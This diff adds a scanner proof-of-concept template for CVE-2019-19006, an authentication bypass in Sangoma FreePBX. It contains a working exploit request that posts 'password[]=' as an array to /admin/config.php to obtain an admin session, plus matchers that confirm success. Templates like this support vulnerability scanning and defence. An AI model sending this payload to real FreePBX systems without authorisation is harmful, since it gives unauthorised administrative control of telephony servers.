@@ -1,0 +1,35 @@
+[info]
+author = "AVE"
+description = "通过将 password 参数以数组形式(password[])发送，绕过 FreePBX 登录认证，无需有效密码即可获取 admin 会话权限"
+id = "POC-AVE-2019-1008"
+name = "Sangoma FreePBX Authentication Bypass PoC"
+severity = "critical"
+tags = ["cve-2019-19006"]
+vuln_id = [
+    "CVE-2019-19006",
+    "AVE-2019-1008",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/admin/config.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "username=admin&password[]=&login="
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "FreePBX Administration",
+    "config.php?display=",
+]
